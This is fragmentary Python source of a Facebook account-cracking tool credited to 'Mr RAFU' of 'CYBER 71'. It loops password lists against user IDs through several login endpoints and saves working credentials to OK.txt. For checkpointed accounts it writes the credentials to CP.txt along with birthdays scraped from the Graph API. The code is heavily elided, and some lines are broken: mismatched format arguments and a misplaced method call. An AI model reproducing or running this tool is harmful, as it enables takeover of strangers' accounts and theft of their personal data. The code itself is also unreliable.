...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#RAFU('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							RAFU('[•] Result CP saved to CP.txt')
							RAFU('\n\tCrack Processing...\n')
							RAFU('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					RAFU('\n01.) Metode b-api ')
					RAFU('02.) Metode mbasic ')
					RAFU('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			RAFU('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			RAFU(' [1] ABRAHAM Method 1 ')
			RAFU(' [2] ABRAHAM Method 2  [ Pro ]')
			RAFU(' [3] ABRAHAM Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [ABRAHAM] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				RAFU('\r\033[1;92m[Successful-ABRAHAM] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					RAFU('\r\033[1;91m[Checkpoint-ABRAHAM] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				RAFU('\r\033[1;91m[Checkpoint-ABRAHAM] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				RAFU('\r\033[1;32m[Successful-ABRAHAM] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_RAFU('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].RAFU('\r\033[1;91m[Checkpoint-ABRAHAM] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				RAFU('\r\033[1;92m[Successful-ABRAHAM] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = RAFU('token.txt').read()
					cp_ttl = Prof_ABRAHAM('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					RAFU('\r\033[1;91m[Checkpoint-ABRAHAM] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : Mr RAFU
    Facebook : https://facebook.com/RAFU.ABRAHAM
    Team     : CYBER 71 
    Connect  : +8801982876336
 [*]=============================================
